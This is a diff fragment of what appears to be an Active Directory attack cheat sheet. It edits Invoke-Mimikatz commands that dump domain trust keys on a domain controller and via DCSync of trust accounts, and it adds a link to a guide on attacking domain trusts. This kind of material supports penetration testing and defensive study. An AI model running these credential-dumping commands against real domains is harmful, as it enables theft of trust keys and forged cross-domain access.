@@ -848,9 +848,13 @@ On the DC:
 ```Invoke-Mimikatz -Command '"lsadump::trust /patch"'```
 
 OR via DCSync:
-```Invoke-Mimikatz -Command '"lsadump::dcsync /user:bcorp\bob$"'```
+```Invoke-Mimikatz -Command '"lsadump::dcsync /user:ecorp\bcorp$"'```
 
-```Invoke-Mimikatz -Command '"lsadump::dcsync /domain:external.local /user:bob$"'```
+"_DCSync, by querying the FOREIGN_DOMAIN_SHORTNAME$ account_": 
+
+- https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d
+
+```Invoke-Mimikatz -Command '"lsadump::dcsync /domain:external.local /user:SUB$"'```
 
 
 trust tkt -
